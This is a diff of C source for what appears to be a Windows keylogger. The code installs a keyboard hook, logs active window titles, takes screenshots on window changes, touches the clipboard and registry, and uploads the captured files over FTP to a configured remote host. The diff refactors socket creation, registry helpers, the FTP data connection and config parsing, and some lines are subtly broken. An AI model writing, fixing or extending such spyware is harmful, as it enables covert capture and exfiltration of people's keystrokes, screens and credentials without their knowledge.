@@ -26,51 +26,56 @@ void get_this_dir_path(char *this_dir_path)
     this_dir_path[len_path] = '\0';
 }
 
-SOCKET create_socket( char * serverHost, int serverPort )
+SOCKET create_socket(const char* _host, const char* port)
 {
-    SOCKET Socket = INVALID_SOCKET;
-    WSADATA WsaDat;
-    struct hostent *host;
-    SOCKADDR_IN SockAddr;
+	SOCKET sd = INVALID_SOCKET;
+	WSADATA wsaData;
+	struct addrinfo hints;
+	struct addrinfo* result;
+	int err;
 
-	// Initialise Winsock
-	if (  WSAStartup( MAKEWORD(2,2), &WsaDat ) != 0 )
+	// Initialize WinSock
+	err = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if (err != NO_ERROR)
 	{
-		//printf( "WSA Initialization failed! Error code: %d\n", WSAGetLastError() );
+		fprintf(stderr, "WSAStartup failed with error: %d\n", err);
 		WSACleanup();
-        return INVALID_SOCKET;
-	}
-	
-	Socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
-	if ( Socket == INVALID_SOCKET )
-	{
-		//printf( "Socket creation failed. Error code: %d\n", WSAGetLastError() );
-		WSACleanup();
-        return INVALID_SOCKET;
+		return 0;
 	}
 
-	// Resolve IP address for hostname
-	if ( ( host = gethostbyname( serverHost ) ) == NULL )
+	memset(&hints, 0, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+	hints.ai_flags = AI_CANONNAME;
+
+	err = getaddrinfo(_host, port, &hints, &result);
+	if (err != 0)
 	{
-		//printf( "Failed to resolve hostname. Error code: %d\n", WSAGetLastError() );
+		fprintf(stderr, "Error: %d, getaddrinfo, host=%s, port=%s\n", err, _host, port);
 		WSACleanup();
-        return INVALID_SOCKET;
+		return 0;
 	}
 
-	// Setup our socket address structure
-    SockAddr.sin_port = htons( (u_short)serverPort );
-	SockAddr.sin_family = AF_INET;
-	SockAddr.sin_addr.s_addr = *( (unsigned long*)host->h_addr );
-
-	// Attempt to connect to server
-	if ( connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0 )
+	sd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	if (sd == INVALID_SOCKET)
 	{
-		//printf( "Failed to establish connection with server. Error code: %d\n", WSAGetLastError() );
+		fprintf(stderr, "Socket creation failed.\n");
 		WSACleanup();
-        return INVALID_SOCKET;
+		return 0;
 	}
 
-	return Socket;
+	if (connect(sd, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
+	{
+		if (WSAGetLastError() != WSAEWOULDBLOCK)
+			closesocket(sd);
+
+		fprintf(stderr, "Failed to establish connection with server\n");
+		WSACleanup();
+		return 0;
+	}
+
+	return sd;
 }
 
 void delete_socket(SOCKET s)
@@ -188,57 +193,57 @@ bool screen_shot(char *szFilename, int Top, int Left, int Width, int Height)
 	return result;
 }
 
-void get_registry_key( HKEY hKey,
-                       char *keyPath,
-                       char *keyName,
+void get_registry_key( HKEY h_key,
+                       char *key_path,
+                       char *key_name,
                        char * reg_key )
 {
-	HKEY rKey;
-	unsigned char keyData[STR_SIZE];	
+	HKEY r_key;
+	unsigned char key_data[STR_SIZE];	
 	long res;
-    DWORD Type= REG_SZ;
-    DWORD sizeData = sizeof( keyData );
+    DWORD r_type = REG_SZ;
+    DWORD size_data = sizeof( key_data );
 	
-	res = RegOpenKeyEx( 	hKey, 
-                            (LPCWSTR)keyPath,
+	res = RegOpenKeyEx( 	h_key, 
+                            (LPCWSTR)key_path,
 							0, 
 							KEY_QUERY_VALUE, 
-							&rKey );
+							&r_key );
     //if ( res != ERROR_SUCCESS )
 		//printf("Error Opening Registry Key\n");
 	
-	res = RegQueryValueEx(	rKey, 
-                            (LPCWSTR)keyName,
+	res = RegQueryValueEx(	r_key, 
+                            (LPCWSTR)key_name,
                             NULL,
-							&Type, 
-							keyData, 
-							&sizeData );
+							&r_type, 
+							key_data, 
+							&size_data );
 	if ( res != ERROR_SUCCESS ) 	
 		//printf("Error Reading Value\n");
 	
-	strcpy(reg_key, (char *)keyData);
-	RegCloseKey( rKey );	
+	strcpy(reg_key, (char *)key_data);
+	RegCloseKey( r_key );	
 }
 
-bool set_registry_key( HKEY hKey,
-                       const char keyPath[],
-                       const char keyName[],
-                       char *keyData )
+bool set_registry_key( HKEY h_key,
+                       const char key_path[],
+                       const char key_name[],
+                       char *key_data )
 {
-	HKEY rKey;
-    DWORD Type= REG_SZ;
-    DWORD sizeData = strlen( keyData );
+	HKEY r_key;
+    DWORD r_type= REG_SZ;
+    DWORD size_data = strlen( key_data );
     DWORD disposition;
 	long res;
 	
-	res = RegCreateKeyEx(	hKey, 
-                            (LPCWSTR)keyPath,
+	res = RegCreateKeyEx(	h_key, 
+                            (LPCWSTR)key_path,
                             0,
 							NULL, 
 							REG_OPTION_NON_VOLATILE, 
 							KEY_ALL_ACCESS, 
 							NULL, 
-							&rKey, 
+							&r_key, 
 							&disposition );
 
 	if ( disposition != REG_CREATED_NEW_KEY && disposition != REG_OPENED_EXISTING_KEY )
@@ -247,19 +252,19 @@ bool set_registry_key( HKEY hKey,
 		//printf("Error Create Key");
 	}
 
-	res = RegSetValueEx( 	rKey, 
-                            (LPCWSTR)keyName,
+	res = RegSetValueEx( 	r_key, 
+                            (LPCWSTR)key_name,
                             0,
-							Type, 
-							(const unsigned char *)keyData, 
-							sizeData );
+							r_type, 
+							(const unsigned char *)key_data, 
+							size_data );
 	if ( res != ERROR_SUCCESS ) 
 	{
 		return false;
 		//printf("Error Set Value");
 	}
 
-	RegCloseKey( rKey );
+	RegCloseKey( r_key );
 	return true;
 }
 
@@ -305,10 +310,9 @@ void recv_msg(SOCKET socket, char *get_buffer, unsigned int size)
     //printf( "server: %s", get_buffer );
 }
 
-bool upload_file(	struct
-                    ftp_config *config,
-                    char *file_name,
-                    char *path_file )
+bool upload_file(	const struct ftp_config *config,
+	const char *file_name,
+	const char *path_file )
 {
     SOCKET socket;
     SOCKET socket_data;
@@ -330,6 +334,7 @@ bool upload_file(	struct
 	char cmd_type[CMD_SIZE];
 	char cmd_pasv[CMD_SIZE];
 	char cmd_stor[CMD_SIZE];
+	char s_port_data[CMD_SIZE];
 
     sprintf(cmd_user, "%s %s\r\n", USER, config->login);
     sprintf(cmd_pass, "%s %s\r\n", PASS, config->password);
@@ -339,7 +344,7 @@ bool upload_file(	struct
 	sprintf(cmd_pasv, "%s\r\n", PASV);	
 	sprintf(cmd_stor, "%s %s\r\n", STOR, file_name);
 	
-    socket = create_socket( config->host, atoi(config->port) );
+    socket = create_socket( config->host, config->port );
 	if ( !socket )
 	{
 		//printf("Error creating socket!");
@@ -382,10 +387,11 @@ bool upload_file(	struct
     recv_msg(socket, tmp1, sizeof(tmp1));
     sprintf(get_buffer, "%s", tmp1);
 
-    send_cmd(socket, cmd_stor);
+	port_data = get_data_port(get_buffer);
+	snprintf(s_port_data, sizeof(s_port_data), "%d", port_data);
+	socket_data = create_socket(config->host, s_port_data);
 
-    port_data = get_data_port(get_buffer);
-    socket_data = create_socket(config->host, port_data);
+    send_cmd(socket, cmd_stor);
 
     recv_msg(socket, tmp2, sizeof(tmp2));
 	sprintf(get_buffer, "%s", tmp2);
@@ -449,19 +455,19 @@ void set_clipboard()
 
 void change_window()
 {
-	char cWindow[STR_SIZE];
+	char c_window[STR_SIZE];
 	char info_title[STR_SIZE_MAX];
     char tmp_str[STR_SIZE];
     bool result;
-    HWND newWindow = GetForegroundWindow();
+    HWND new_window = GetForegroundWindow();
 
-	if(old_window == NULL || newWindow != old_window)
+	if(old_window == NULL || new_window != old_window)
 	{
 		// Get Active window title and store it
-		GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
-		sprintf(info_title, "\nACTIVE WINDOW: %s\n", cWindow);
+		GetWindowTextA(GetForegroundWindow(), c_window, sizeof(c_window));
+		sprintf(info_title, "\nACTIVE WINDOW: %s\n", c_window);
 		write_log(info_title);
-		old_window = newWindow;
+		old_window = new_window;
 
 		// Create screenshot
 		++i_bmp;		
@@ -479,7 +485,7 @@ void change_window()
 }
 
 
-int CALLBACK keyoard_hook(int n_code, DWORD w_param, DWORD l_param)
+int CALLBACK keybard_hook(int n_code, DWORD w_param, DWORD l_param)
 {
     DWORD finish_time;
     DWORD diff_time_sec;
@@ -649,25 +655,25 @@ bool read_config(	const char config_file[],
 	{
 		if( strstr(str, "host") != NULL )
 		{	
-			strtok(str, " :"); 
+			strtok(str, ":"); 
             sprintf(ftp->host, strtok(NULL, " :"));
             null_terminate(ftp->host);
 		}
 		else if( strstr(str, "port") != NULL )
 		{	
-			strtok(str, " :"); 
+			strtok(str, ":"); 
             sprintf(ftp->port, strtok(NULL, " :"));
             null_terminate(ftp->port);
 		}
 		else if( strstr(str, "login") != NULL )
 		{	
-			strtok(str, " :"); 
+			strtok(str, ":"); 
             sprintf(ftp->login, strtok(NULL, " :"));
             null_terminate(ftp->login);
 		}
 		else if( strstr(str, "password") != NULL )
 		{	
-			strtok(str, " :"); 
+			strtok(str, ":"); 
             sprintf(ftp->password, strtok(NULL, " :"));
             null_terminate(ftp->password);
 		}
